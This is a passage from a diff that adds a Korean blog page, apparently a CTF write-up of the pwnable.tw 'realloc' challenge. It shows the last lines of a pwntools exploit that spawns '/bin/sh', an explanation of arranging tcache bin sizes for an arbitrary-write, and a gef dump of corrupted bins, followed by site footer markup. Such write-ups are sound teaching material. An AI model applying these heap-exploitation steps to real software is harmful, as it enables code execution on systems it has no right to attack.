class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>여기서 특징은 malloc하고 realloc 할 때 각각 다른 크기의 빈에 들어가게 해주어야 하는데, 만약 임의로 덮을 주소가 저장 되어있는 힙 청크과 빈이 겹치게 되면 횟수 제한 때문에 그 공간에 할당을 할 수가 없다. 그래서 익스플로잇 코드를 살펴보면 모두 크기 정렬이 다르게 되어있는 것을 볼 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tcachebins[idx=8759410268495, size=0x7f7758999510, count=2] ←  Chunk(addr=0x404048, size=0x7f7758999510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x7f77588fd2f0, size=0x401f0f00004050, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x7f77588fd2f0]</span><br><span class="line">Tcachebins[idx=8759410268495, size=0x7f7758999510, count=2] ←  Chunk(addr=0x404048, size=0x7f7758999510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x7f77588fd2f0, size=0x401f0f00004050, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x7f77588fd2f0]</span><br><span class="line">Tcachebins[idx=3, size=0x50, count=1] ←  Chunk(addr=0xc632e0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">Tcachebins[idx=3, size=0x50, count=1] ←  Chunk(addr=0xc632e0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">Tcachebins[idx=6, size=0x80, count=1] ←  Chunk(addr=0xc63260, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">Tcachebins[idx=6, size=0x80, count=1] ←  Chunk(addr=0xc63260, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br></pre></td></tr></table></figure>
+
+<p>gef로 bins 를 살펴보면 이런식으로 깔-끔하게 들어가있는 모습을 볼 수 있다.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.1.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&text=pwnable.tw realloc"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&is_video=false&description=pwnable.tw realloc"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw realloc&body=Check out this article: http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&name=pwnable.tw realloc&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&t=pwnable.tw realloc"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    p0her
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
